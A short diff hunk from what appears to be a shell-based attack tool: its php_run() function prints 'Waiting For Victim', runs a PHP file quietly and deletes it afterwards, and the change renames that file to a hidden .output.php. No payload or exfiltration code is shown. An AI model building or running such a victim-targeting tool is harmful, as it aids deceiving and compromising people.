@@ -96,9 +96,9 @@ php_run() {
 	sleep 3
 	echo ""
 	echo -e "${BLUE} [${GREEN}*${BLUE}]${RED}Waiting For Victim..... ctrl + c"
-	php whitehat.php > /dev/null
+	php .output.php > /dev/null
 	sleep 1
-	rm whitehat.php
+	rm .output.php
 	echo ""
 
 
